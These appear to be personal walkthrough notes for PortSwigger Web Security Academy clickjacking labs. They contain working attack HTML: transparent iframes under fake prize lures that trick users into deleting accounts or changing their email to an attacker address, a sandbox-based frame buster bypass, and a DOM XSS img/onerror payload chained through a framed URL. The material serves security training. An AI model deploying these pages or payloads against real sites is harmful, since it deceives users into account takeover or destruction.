# Clickjacking (UI redressing)
https://portswigger.net/web-security/clickjacking


basic clickjacking:
```htm
<html>
    <head>
        <style>
            #vulnarble_website {
                position:relative;
                width:128px;
                height:128px;
                opacity:0.00001;
                z-index:2;
                }
            #decoy_website {
                position:absolute;
                width:300px;
                height:400px;
                z-index:1;
                }
        </style>
    </head>
    ...
    <body>
        <div id="decoy_website">
        ...decoy web content here...
        </div>
        <iframe id="vulnarble_website" src="https://vulnerable-website.com">
        </iframe>
    </body>
</html>
```



1. <!-- Lab: Basic clickjacking with CSRF token protection -->
https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected

using the page at /my-account, targeting the delete account button (dont test delete your own account - it will break the lab)


```htm
<html>
    <head>
        <style>
            #vulnarble_website {
                position:relative;
                width:1920px;
                height:720px;
                top: 75px;
                left: -95px;
                opacity:0.2;
                z-index:2;
                padding-left:80px
                }
            #attacker_website {
                position:absolute;
                z-index:1;
                }
            #attacker_website button {
                margin-left: 425px;
                margin-top: 450;
                }
        </style>
    </head>
    <body>
         <div id="attacker_website">
            <h1>You Are The Winner!!!</h1>
            <h2>You won an awesome tropics holiday!</h2>
            <h2>Accept it by clicking the button below.</h2>
            <button type="reset">Click 2 Win!</button>
        </div>      
        <iframe id="vulnarble_website" src="https://0aa600720483fd5bc09a01d700f500e2.web-security-academy.net/my-account">
        </iframe>
    </body>
</html>

```



# DUDE!




2. <!-- Lab: Clickjacking with form input data prefilled from a URL parameter -->
https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input

 To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed. 

login, and test change your own email address. send req to repeater

use the same iframe as before - just with ?paramater in the adress to fill the email address for the victim




<html>
    <head>
        <style>
            #vulnarble_website {
                position:relative;
                width:1920px;
                height:720px;
                top: 85px;
                opacity:0.2;
                z-index:2;
                }
            #attacker_website {
                position:absolute;
                z-index:1;
                }
            #attacker_website button {
                margin-left: 425px;
                margin-top: 390;
                }
        </style>
    </head>
    <body>
         <div id="attacker_website">
            <h1>You Are The Winner!!!</h1>
            <h2>You won an awesome tropics holiday!</h2>
            <h2>Accept it by clicking the button below.</h2>
            <button type="reset">Click 2 Win!</button>
        </div>      
        <iframe id="vulnarble_website" src="https://0a14005903ae774bc1214359001900c6.web-security-academy.net/my-account?email=attacker@gmail.com">
        </iframe>
    </body>
</html>



# DUDE!




3. <!-- Lab: Clickjacking with a frame buster script -->
https://portswigger.net/web-security/clickjacking/lab-frame-buster-script


material: 
https://www.w3schools.com/tags/att_iframe_sandbox.asp


hint: 
frame breaker:
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>

HTML5 iframe sandbox - allow-forms or allow-scripts
allow-top-navigation - omitted


use the same html clickjacking site with snadbox attribute added to the iframe

<html>
    <head>
        <style>
            #vulnarble_website {
                position:relative;
                width:1920px;
                height:720px;
                top: 85px;
                opacity:0.2;
                z-index:2;
                }
            #attacker_website {
                position:absolute;
                z-index:1;
                }
            #attacker_website button {
                margin-left: 425px;
                margin-top: 390;
                }
        </style>
    </head>
    <body>
         <div id="attacker_website">
            <h1>You Are The Winner!!!</h1>
            <h2>You won an awesome tropics holiday!</h2>
            <h2>Accept it by clicking the button below.</h2>
            <button type="reset">Click 2 Win!</button>
        </div>      
        <iframe id="vulnarble_website" src="https://0abc009104710aa2c0390922007b0011.web-security-academy.net/my-account?email=attacker@gmail.com" sandbox="allow-forms" >
        </iframe>
    </body>
</html>


# DUDE!


4. <!-- Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS -->
https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss

to solve the lab: construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function. 

1 . lets look for Dom sinks (innerHTML, document.location, search, etc.). observe in page GET /feedback HTTP/1.1 a call for js script page GET /resources/js/submitFeedback.js HTTP/1.1. inside we find inerHTML function:

    function displayFeedbackMessage(name) {
        return function() {
            var feedbackResult = document.getElementById("feedbackResult");
            if (this.status === 200) {
                feedbackResult.innerHTML = "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
                feedbackForm.reset();

the innerhtml might make the name field vulnarble to DOM XSS!

2 . lets breakout of context using img> tag (since Script> tag dont work in innerhtml) :
    feedbackResult.innerHTML = "Thank you for submitting feedback" + (
    "dude")<<img src=1 onerror=print(document.domain)><!--
    name ? ", " + name : "") + "!";
            feedbackForm.reset();

final payload to be inserted into the name field
"dude")<<img src=1 onerror=print(document.domain)><!--

test payload in browser and get a POP!

3 . copy working payload (without csrf token) from POST /feedback/submit HTTP/1.1 and send POST /feedback HTTP/1.1 to repeater. paste payload Parameters and change request method to GE. copy url and insert to iframe at exploit server.

crafted exploit html:

<html>
    <head>
        <style>
            #vulnarble_website {
                position:relative;
                width:1920px;
                height:1080;
                top: 85px;
                opacity:0.5;
                z-index:2;
                }
            #attacker_website {
                position:absolute;
                z-index:1;
                }
            #attacker_website button {
                margin-left: 425px;
                margin-top: 850;
                }
        </style>
    </head>
    <body>
         <div id="attacker_website">
            <h1>You Are The Winner!!!</h1>
            <button type="button">Click 2 Win!</button>
        </div>      
        <iframe id="vulnarble_website" src="https://0a6100e4047ca3d1c041c16700440011.web-security-academy.net/feedback?name=%22dude%22%29%3C%3Cimg+src%3D1+onerror%3Dprint%28document.domain%29%3E%3C%21--&email=clean%40token.com&subject=123+sbjct&message=XSSed!">
        </iframe>
    </body>
</html>


# DUDE!




5. <!-- Lab: Multistep clickjacking -->
https://portswigger.net/web-security/clickjacking/lab-multistep

lets take the format from the 2nd lab for 1st stage:
<html>
    <head>
        <style>
            #vulnarble_website_del {
                position:relative;
                width:1920px;
                height:720px;
                opacity:0.2;
                z-index:2;
                }
            #stage1 {
                position:absolute;
                z-index:1;
                }
            #stage1 button {
                margin-left: 400;
                margin-top: 350;
                }
            #stage2 {
                position:absolute;
                z-index:1;
                }
            #stage2 button {
                margin-left: 550;
                margin-top: 320;
                }      
        </style>
    </head>
    <body>
        <div id="stage2">
            <button type="reset">click me next</button>
        </div>               
        <div id="stage1">
            <h1>You Are The Winner!!!</h1>
            <h2>You won an awesome tropics holiday!</h2>
            <h2>Accept it by clicking the button below.</h2>
            <button type="reset">Click me first!</button>
        </div>      
        <iframe id="vulnarble_website_del" src="https://0a8700ab04b944c3c0637dac002100c2.web-security-academy.net/my-account">
        </iframe>
    </body>
</html>


# DUDE!

portswigger solution:

<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="$url"></iframe>


